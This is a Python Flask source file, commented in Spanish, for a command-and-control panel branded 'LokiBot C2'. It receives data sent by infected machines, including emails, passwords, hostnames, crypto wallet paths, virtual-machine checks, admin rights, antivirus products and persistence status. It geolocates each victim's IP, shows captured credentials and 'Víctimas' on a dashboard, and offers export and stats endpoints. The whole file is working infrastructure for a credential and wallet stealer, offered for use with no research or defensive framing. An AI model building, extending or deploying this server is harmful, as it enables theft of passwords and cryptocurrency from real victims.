from flask import Flask, request, render_template_string, jsonify
import datetime
import requests
import json

app = Flask(__name__)
datos_recibidos = []

def obtener_info_geo(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        return {
            "pais": response.get("country", "Desconocido"),
            "region": response.get("regionName", "Desconocido"),
            "ciudad": response.get("city", "Desconocido")
        }
    except:
        return {"pais": "Error", "region": "-", "ciudad": "-"}

@app.route('/receive', methods=['POST'])
def receive():
    data = request.json
    data['fecha_hora'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # IP y User-Agent
    data['ip'] = request.remote_addr
    data['user_agent'] = request.headers.get('User-Agent', 'Desconocido')

    # Geolocalización aproximada
    geo = obtener_info_geo(data['ip'])
    data.update(geo)
    
    datos_recibidos.append(data)
    
    # Log más detallado
    print(f"[+] Datos recibidos: {data['email']} - {data['estado']}")
    if 'info_sistema' in data:
        sistema = data['info_sistema']
        print(f"[+] Sistema: {sistema.get('hostname', 'Unknown')} ({sistema.get('sistema', 'Unknown')})")
    if 'wallets_encontrados' in data:
        print(f"[+] Wallets detectados: {len(data['wallets_encontrados'])}")
    if 'sistema_objetivo' in data:
        print(f"[+] Target válido: {not data['sistema_objetivo'].get('es_vm', False)}")
    
    return jsonify({'status': 'ok'})

@app.route('/')
def dashboard():
    html = '''
    <html>
    <head>
        <title>LokiBot C2 - Panel Avanzado</title>
        <style>
            body {
                font-family: monospace;
                background-color: #0d1117;
                color: #c9d1d9;
                padding: 20px;
            }
            h1 {
                color: #58a6ff;
                text-align: center;
                margin-bottom: 30px;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: #161b22;
                padding: 15px;
                border-radius: 8px;
                border: 1px solid #30363d;
            }
            .stat-card h3 {
                color: #58a6ff;
                margin: 0 0 10px 0;
            }
            .credentials-table {
                width: 100%;
                border-collapse: collapse;
                background-color: #161b22;
                margin-bottom: 30px;
            }
            .credentials-table th, .credentials-table td {
                border: 1px solid #30363d;
                padding: 8px;
                text-align: center;
            }
            .credentials-table th {
                background-color: #21262d;
                color: #58a6ff;
            }
            .credentials-table tr:nth-child(even) {
                background-color: #1c2128;
            }
            .details-section {
                margin-top: 30px;
            }
            .target-info {
                background: #161b22;
                padding: 15px;
                border-radius: 8px;
                border: 1px solid #30363d;
                margin-bottom: 20px;
            }
            .target-info h3 {
                color: #58a6ff;
                margin-top: 0;
            }
            .info-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 20px;
            }
            .info-box {
                background: #0d1117;
                padding: 10px;
                border-radius: 5px;
                border: 1px solid #30363d;
            }
            .info-box h4 {
                color: #f85149;
                margin: 0 0 10px 0;
            }
            .wallet-item {
                background: #1c2128;
                padding: 5px;
                margin: 5px 0;
                border-radius: 3px;
            }
            .success { color: #56d364; }
            .error { color: #f85149; }
            .warning { color: #e3b341; }
        </style>
    </head>
    <body>
        <h1>🔥 LokiBot C2 - Panel de Control Avanzado 🔥</h1>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Total Víctimas</h3>
                <div style="font-size: 24px; color: #56d364;">{{ datos|length }}</div>
            </div>
            <div class="stat-card">
                <h3>Credenciales Válidas</h3>
                <div style="font-size: 24px; color: #f85149;">{{ credenciales_validas }}</div>
            </div>
            <div class="stat-card">
                <h3>Wallets Detectados</h3>
                <div style="font-size: 24px; color: #e3b341;">{{ total_wallets }}</div>
            </div>
            <div class="stat-card">
                <h3>Targets Válidos</h3>
                <div style="font-size: 24px; color: #58a6ff;">{{ targets_validos }}</div>
            </div>
        </div>

        <h2 style="color: #58a6ff;">📊 Credenciales Capturadas</h2>
        <table class="credentials-table">
            <tr>
                <th>Email</th>
                <th>Password</th>
                <th>Estado</th>
                <th>Fecha</th>
                <th>IP</th>
                <th>Sistema</th>
                <th>Wallets</th>
            </tr>
            {% for intento in datos %}
            <tr>
                <td>{{ intento['email'] }}</td>
                <td>{{ intento['password'] }}</td>
                <td class="{% if intento['estado'] == 'Correcto' %}success{% else %}error{% endif %}">
                    {{ intento['estado'] }}
                </td>
                <td>{{ intento['fecha_hora'] }}</td>
                <td>{{ intento['ip'] }}</td>
                <td>
                    {% if intento.get('info_sistema') %}
                        {{ intento['info_sistema'].get('hostname', 'Unknown') }}
                    {% else %}
                        N/A
                    {% endif %}
                </td>
                <td>
                    {% if intento.get('wallets_encontrados') %}
                        {{ intento['wallets_encontrados']|length }}
                    {% else %}
                        0
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
        </table>

        <div class="details-section">
            <h2 style="color: #58a6ff;">🎯 Información Detallada de Targets</h2>
            {% for intento in datos %}
            {% if intento.get('info_sistema') %}
            <div class="target-info">
                <h3>Target: {{ intento['email'] }} ({{ intento['fecha_hora'] }})</h3>
                <div class="info-grid">
                    <div class="info-box">
                        <h4>💻 Sistema</h4>
                        <p><strong>Host:</strong> {{ intento['info_sistema'].get('hostname', 'N/A') }}</p>
                        <p><strong>Usuario:</strong> {{ intento['info_sistema'].get('usuario', 'N/A') }}</p>
                        <p><strong>OS:</strong> {{ intento['info_sistema'].get('sistema', 'N/A') }}</p>
                        <p><strong>Arch:</strong> {{ intento['info_sistema'].get('arquitectura', 'N/A') }}</p>
                    </div>
                    
                    <div class="info-box">
                        <h4>🔒 Seguridad</h4>
                        {% if intento.get('sistema_objetivo') %}
                        <p><strong>VM:</strong> 
                            <span class="{% if intento['sistema_objetivo'].get('es_vm') %}warning{% else %}success{% endif %}">
                                {{ 'Sí' if intento['sistema_objetivo'].get('es_vm') else 'No' }}
                            </span>
                        </p>
                        <p><strong>Admin:</strong> 
                            <span class="{% if intento['sistema_objetivo'].get('permisos_admin') %}success{% else %}error{% endif %}">
                                {{ 'Sí' if intento['sistema_objetivo'].get('permisos_admin') else 'No' }}
                            </span>
                        </p>
                        <p><strong>Antivirus:</strong> {{ intento['sistema_objetivo'].get('antivirus_detectado', [])|join(', ') or 'Ninguno' }}</p>
                        {% endif %}
                    </div>
                    
                    <div class="info-box">
                        <h4>💰 Wallets Detectados</h4>
                        {% if intento.get('wallets_encontrados') %}
                        {% for wallet in intento['wallets_encontrados'] %}
                        <div class="wallet-item">
                            <strong>{{ wallet.wallet }}</strong><br>
                            <small>{{ wallet.ruta }}</small>
                        </div>
                        {% endfor %}
                        {% else %}
                        <p>No se encontraron wallets</p>
                        {% endif %}
                    </div>
                    
                    <div class="info-box">
                        <h4>🔄 Persistencia</h4>
                        {% if intento.get('persistencia') %}
                        <p><strong>Estado:</strong> 
                            <span class="{% if intento['persistencia'].get('persistencia') == 'creada' %}success{% else %}error{% endif %}">
                                {{ intento['persistencia'].get('persistencia', 'Error') }}
                            </span>
                        </p>
                        <p><strong>Registro:</strong> {{ intento['persistencia'].get('registro', 'N/A') }}</p>
                        {% endif %}
                    </div>
                </div>
            </div>
            {% endif %}
            {% endfor %}
        </div>
    </body>
    </html>
    '''
    
    # Calcular estadísticas
    credenciales_validas = sum(1 for d in datos_recibidos if d.get('estado') == 'Correcto')
    total_wallets = sum(len(d.get('wallets_encontrados', [])) for d in datos_recibidos)
    targets_validos = sum(1 for d in datos_recibidos if d.get('sistema_objetivo', {}).get('es_vm') == False)
    
    return render_template_string(html, 
                                datos=datos_recibidos,
                                credenciales_validas=credenciales_validas,
                                total_wallets=total_wallets,
                                targets_validos=targets_validos)

@app.route('/export')
def export_data():
    """Exporta todos los datos recolectados en formato JSON"""
    return jsonify({
        'total_victimas': len(datos_recibidos),
        'fecha_export': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'datos': datos_recibidos
    })

@app.route('/stats')
def stats():
    """Muestra estadísticas generales"""
    stats = {
        'total_intentos': len(datos_recibidos),
        'credenciales_validas': sum(1 for d in datos_recibidos if d.get('estado') == 'Correcto'),
        'sistemas_infectados': len(set(d.get('info_sistema', {}).get('hostname', 'unknown') for d in datos_recibidos)),
        'wallets_total': sum(len(d.get('wallets_encontrados', [])) for d in datos_recibidos),
        'targets_no_vm': sum(1 for d in datos_recibidos if not d.get('sistema_objetivo', {}).get('es_vm', True)),
        'con_permisos_admin': sum(1 for d in datos_recibidos if d.get('sistema_objetivo', {}).get('permisos_admin', False))
    }
    return jsonify(stats)

if __name__ == '__main__':
    app.run(port=5000)
